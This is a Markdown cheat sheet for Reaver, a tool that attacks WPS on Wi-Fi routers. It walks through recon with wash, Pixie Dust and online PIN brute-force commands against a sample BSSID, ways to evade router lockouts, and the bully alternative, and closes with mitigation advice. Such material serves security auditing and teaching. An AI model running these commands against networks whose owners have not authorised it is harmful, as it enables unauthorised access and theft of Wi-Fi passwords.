# Reaver Cheatsheet

[Reaver](https://github.com/t6x/reaver-wps-fork-t6x) is a specialized Wi-Fi security auditing tool designed to execute brute-force attacks against Wi-Fi Protected Setup (WPS) registrar PINs. By recovering the 8-digit WPS PIN, Reaver retrieves the plain-text WPA/WPA2 pre-shared key (PSK). It also supports offline Pixie Dust attacks via `pixiewps`.

---

## Table of Contents

- [WPS Vulnerability Mechanics](#wps-vulnerability-mechanics)
- [Installation (`reaver` & `pixiewps`)](#installation-reaver--pixiewps)
- [Reconnaissance: Identifying WPS Networks (`wash`)](#reconnaissance-identifying-wps-networks-wash)
- [Pixie Dust Attack (Instant Key Recovery)](#pixie-dust-attack-instant-key-recovery)
- [Full Online WPS PIN Brute-Force](#full-online-wps-pin-brute-force)
- [AP Rate Limiting & Lockout Handling](#ap-rate-limiting--lockout-handling)
- [Defensive Mitigation](#defensive-mitigation)

---

## WPS Vulnerability Mechanics

WPS PIN authentication uses an 8-digit PIN split into two halves:
- The first half is 4 digits ($10^4 = 10,000$ possibilities).
- The second half is 3 digits + 1 checksum digit ($10^3 = 1,000$ possibilities).
- Instead of testing $10^8 = 100,000,000$ combinations, an attacker only tests at most $10,000 + 1,000 = 11,000$ attempts.
- **Pixie Dust Attack:** Exploits weak PRNG (Pseudo-Random Number Generators) in specific wireless chipsets (Ralink, MediaTek, Realtek, Broadcom) to compute the WPS PIN offline in seconds from just 2 initial packets.

---

## Installation (`reaver` & `pixiewps`)

```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y reaver pixiewps bully

# Arch Linux / BlackArch
sudo pacman -S reaver pixiewps

# Verify command
reaver -h
```

---

## Reconnaissance: Identifying WPS Networks (`wash`)

Before launching Reaver, find access points with WPS enabled and check if they are locked:

```bash
# Put wireless interface into monitor mode
sudo airmon-ng start wlan0
# or:
sudo iw dev wlan0 set type monitor

# Scan for WPS-enabled routers using wash
sudo wash -i wlan0mon
```
Key columns to observe:
- **`WPS Locked`**: If `Yes`, the router has locked WPS PIN attempts due to previous brute-force activity. Target routers showing `No`.
- **`WPS Ver`**: WPS version (1.0 or 2.0).
- **`ESSID` & `BSSID`**: Target network name and MAC.

---

## Pixie Dust Attack (Instant Key Recovery)

The Pixie Dust attack (`-K 1`) is the fastest attack against WPS. It collects the E-Hash1, E-Hash2, and nonces from the router and cracks the PIN offline without triggering rate limits:

```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -K 1 -vv
```
- `-i wlan0mon`: Monitor mode interface.
- `-b <bssid>`: Target router MAC.
- `-c 6`: Channel of the target AP.
- `-K 1`: Run automatic Pixie Dust attack via `pixiewps`.
- `-vv`: Verbose output.

*If vulnerable, the PIN and WPA PSK are printed in under 10 seconds.*

---

## Full Online WPS PIN Brute-Force

If Pixie Dust fails, fall back to online brute-forcing:

```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv
```

Once the PIN is discovered, Reaver outputs:
```text
[+] Pin cracked in 4520 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'SuperSecretWiFiPassword'
[+] AP SSID: 'Target_Network'
```

---

## AP Rate Limiting & Lockout Handling

Many modern routers lock WPS attempts for 5-15 minutes after 3-5 failed tries. Use delay and retry tuning flags:

```bash
# Delay 10 seconds between attempts
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 10 -vv

# Wait 300 seconds if the router locks WPS
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 5 --lock-delay=300 -vv

# Ignore NACK packets and keep trying
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 --ignore-locks -vv
```

### Alternative: Using `bully`
`bully` is a fast C implementation of the WPS attack that handles odd router implementations well:
```bash
sudo bully -b 00:11:22:33:44:55 -c 6 --pixiewps wlan0mon
```

---

## Defensive Mitigation

- **Disable WPS Entirely:** The most secure recommendation is to turn off WPS in the router web interface.
- **Update Firmware:** Modern routers implement strict rate-limiting, exponential backoff, and fix PRNG entropy flaws exploited by Pixie Dust.
- **Use WPA3:** WPA3 removes legacy PIN-based WPS entirely, replacing it with secure Wi-Fi Easy Connect (DPP).
